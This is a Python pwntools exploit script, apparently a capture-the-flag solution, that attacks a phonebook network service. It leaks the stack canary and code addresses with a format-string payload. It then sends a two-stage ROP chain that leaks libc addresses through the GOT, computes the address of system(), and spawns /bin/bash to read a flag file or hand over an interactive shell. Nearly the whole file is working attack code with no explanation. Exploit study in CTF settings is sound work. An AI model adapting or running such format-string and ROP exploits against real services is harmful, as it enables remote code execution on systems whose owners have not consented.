#!/usr/bin/env python3

from pwn import *

import sys
import re
import time
import struct
import os

# HOST=127.0.0.1 PORT=1227 INTERACTIVE RETRY=5

address = args.HOST or '127.0.0.1'
port = int(args.PORT or 1337)
interactive = True if args.INTERACTIVE else False


#------------- Remote --------------
sock = connect(address, port)
#-----------------------------------



def clearEntry(index):
    indexBytes = str(index).encode("ascii")+b"\n"
    sock.send(b"3\n")
    sock.send(indexBytes)

def getReferences():
    sock.send(b"2\n")
    sock.send(b"%p%p%p%p%p%p%p%p%p%p%p\n")
    sock.send(b"A\n")
    sock.send(b"1\n")
    sock.send(b"0\n")
    time.sleep(1)
    answer = sock.recv(4096).decode("utf-8")
    leak = re.findall(r"(?<=Name: )[0-9a-z()]+(?=\s)", answer)[0]
    #leak = "0x7fffffffb320(nil)0x7ffff7b163800x7ffff7fb1700(nil)0x57202e340a7369700x7fffffffda100x1000000000x19fefca63fabb7000x7fffffffdf900x555555554f400x440x1000000040x25702570257025010x25702570257025700x2570257025702570"
    leak = leak.replace("(nil)", "0x0")
    leakTab = [ int(value, 16) for value in leak.split("0x") if len(value) > 0 ]
    clearEntry(0)
    # leakTab[6] - first entry in phonebook (bool (1B), name, address)
    # leakTab[8] - canary value
    # leakTab[10] - return address to function 0xf40 (in dump):
    return leakTab[6], leakTab[8], leakTab[10]

def libcFuncSetup(funcName, gotPltPtr):
    sock.send(b"2\n")
    sock.send(funcName+b"\n")
    sock.send(gotPltPtr+b"\n")

def setDummyEntry(counter):
    for i in range(counter):
        sock.send(b"2\n")
        time.sleep(0.1)
        out = sock.recv(4096)
        if (out.find(b"Phonebook is full") != -1):
            break
        sock.send(b"dummy\n")
        sock.send(b"A\n")

def popRDI(value):
    #pop rdi; ret;
    addr = gotPltPtr - 0x20108d
    return struct.pack("<Q", addr)+struct.pack("<Q", value)

def popRSI(value):
    #pop rsi; pop r15; ret;
    addr = gotPltPtr - 0x20108f
    return struct.pack("<Q", addr)+struct.pack("<Q", value)+b"A"*8

def getFuncLibcAddrROP(entriesAddr):
    sock.send(b"2\n")
    sock.send(b"AAAA\n")
    # aaaabaaacaaadaaaeaaa faaagaaa haaaiaaa jaaakaaa laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
    #                       canary    rbp      rsp 
    rop = b"aaaabaaacaaadaaaeaaa"+struct.pack("<Q", canary)+b"haaaiaaa"
    rop += popRDI(entriesAddr+1)
    rop += struct.pack("<Q", putsCall)
    rop += popRDI(printfGOT)
    rop += struct.pack("<Q", putsCall)
    rop += popRDI(entriesAddr+entrySize+1)
    rop += struct.pack("<Q", putsCall)
    rop += popRDI(memsetGOT)
    rop += struct.pack("<Q", putsCall)

    #jump to scanf
    rop += popRDI(scanfFormatString)
    rop += popRSI(entriesAddr+entrySize*9+1+128)
    rop += struct.pack("<Q", scanfCall)
    rop += b"\n"
    
    print("First stage ROP: ")
    print(rop)
    time.sleep(1)
    sock.send(rop)
    sock.send(b"4\n")
    time.sleep(0.1)
    ropOut = sock.recv(4096)
    printfBytes = b"printf_\n"
    memsetBytes = b"\nmemset_\n"    
    
    printfAddrBegin = ropOut.find(printfBytes)+len(printfBytes)
    printfAddrEnd = ropOut.find(memsetBytes)
    printfLibcAddr = ropOut[printfAddrBegin:printfAddrEnd]
    printfLibcAddr = printfLibcAddr.ljust(8, b"\0")
    printfLibcAddr = struct.unpack("<Q", printfLibcAddr)[0]

    memsetAddrBegin = ropOut.find(memsetBytes)+len(memsetBytes)
    memsetAddrEnd = -1
    memsetLibcAddr = ropOut[memsetAddrBegin:memsetAddrEnd]
    memsetLibcAddr = memsetLibcAddr.ljust(8, b"\0")
    memsetLibcAddr = struct.unpack("<Q", memsetLibcAddr)[0]
    return printfLibcAddr, memsetLibcAddr

def callSystem(commandAdr):
    rop = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaab"
    rop += popRDI(commandAdr)
    rop += struct.pack("<Q", systemLibcAddr)
    rop += b"\n"
    print("Second stage ROP:")
    print(rop)
    
    sock.send(rop)
    print("Shell activated")
    if interactive:
        sock.interactive()
    else:
        sock.sendline("cat flag.txt")
        try:
            print(sock.recvuntil('}', timeout=5).decode('utf-8'))
            exit(0)
        except:
            exit(1)
    #while True:
    #    cmd = input()
    #    sock.send(cmd.encode("utf-8")+b"\n")
    #    result = sock.recv(4096)
    #    print(result.decode("utf-8"))    


entrySize = 1+128+10
firstEntry, canary, referencePtr = getReferences()
# Difference between reference address and printf got.plt equals 0x201148
gotPltPtr = referencePtr+0x201148
putsGOT = gotPltPtr + 0x20
printfGOT = gotPltPtr + 0x38
memsetGOT = gotPltPtr + 0x40
printfCall = gotPltPtr - 0x201840
putsCall = gotPltPtr - 0x201820
scanfCall = gotPltPtr - 0x2017C0
#pointer to %s
scanfFormatString = gotPltPtr - 0x201017 
print("First entry: {0}".format(hex(firstEntry)))
print("Canary value: {0}".format(hex(canary)))
print("Reference address: {0}".format(hex(referencePtr)))
print(".got.plt address: {0}".format(hex(gotPltPtr)))
print("printf GOT address: {0}".format(hex(printfGOT)))
print("puts GOT address: {0}".format(hex(putsGOT)))
print("memset GOT address: {0}".format(hex(memsetGOT)))
print("puts caller: {0}".format(hex(putsCall)))

#Print data for later exploitation
libcFuncSetup(b"printf_", b"/bin/bash")
libcFuncSetup(b"memset_", b"A")

# ---------------
# Force linker to solve puts symbol
setDummyEntry(9)
clearEntry(9)
# ---------------
try:
    printfLibcAddr, memsetLibcAddr = getFuncLibcAddrROP(firstEntry)
except struct.error as e:
    print("Exploit failed. Need to retry.")
    exit(1)

print("printf libc: {0}".format(hex(printfLibcAddr)))
print("memset libc: {0}".format(hex(memsetLibcAddr)))
print("memset-printf: {0}".format(hex(memsetLibcAddr-printfLibcAddr)))
# 00000000000574d0 <_IO_printf>:
# 000000000015a8a0 <__memset_avx2_unaligned_erms>:
# 00000000000437f0 <__libc_system>:
systemLibcAddr = printfLibcAddr - 0x13CE0
print("system libc: {0}".format(hex(systemLibcAddr)))
callSystem(firstEntry+1+128)
